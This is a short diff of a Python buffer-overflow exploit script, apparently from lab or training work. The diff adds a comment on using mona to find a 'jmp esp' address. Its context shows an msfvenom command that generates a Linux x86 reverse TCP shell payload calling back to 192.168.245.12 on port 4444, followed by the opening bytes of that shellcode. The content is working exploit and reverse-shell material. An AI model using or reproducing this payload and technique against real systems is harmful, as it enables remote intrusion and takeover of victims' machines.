@@ -7,6 +7,7 @@ import time
 import os
 
 # msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.245.12 LPORT=4444 -f py -b "\x00"
+# TO find push esp location --> !mona jmp -r esp
 
 buf =  b""
 buf += b"\xbb\x3b\x14\x66\x5d\xdb\xc8\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
